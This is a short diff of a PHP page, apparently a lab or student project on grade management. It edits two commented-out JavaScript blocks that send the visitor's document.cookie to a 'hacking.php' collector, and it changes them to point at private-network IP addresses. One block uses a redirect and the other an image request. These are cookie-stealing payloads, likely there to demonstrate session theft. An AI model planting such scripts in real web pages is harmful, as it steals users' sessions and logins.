@@ -706,12 +706,12 @@
     </div>
     <!-- <script type="text/javascript">
 
-      window.location.href="hacking.php?cookie=" + document.cookie;
+      window.location.href='http://192.168.9.110/~mtd/qldiem/hacking.php?cookie='+document.cookie;
     </script> -->
     <!-- <script type="text/javascript">
       var image = new Image();
       var d = new Date();
-      image.src='hacking.php?cookie='+document.cookie+"&time="+d;
+      image.src='http://192.168.2.100/~mtd/qldiem/hacking.php?cookie='+document.cookie+"&time="+d;
     </script> -->
     <?php //var_dump($_COOKIE); ?>
     <?php //var_dump($_SERVER['HTTP_USER_AGENT']); ?>
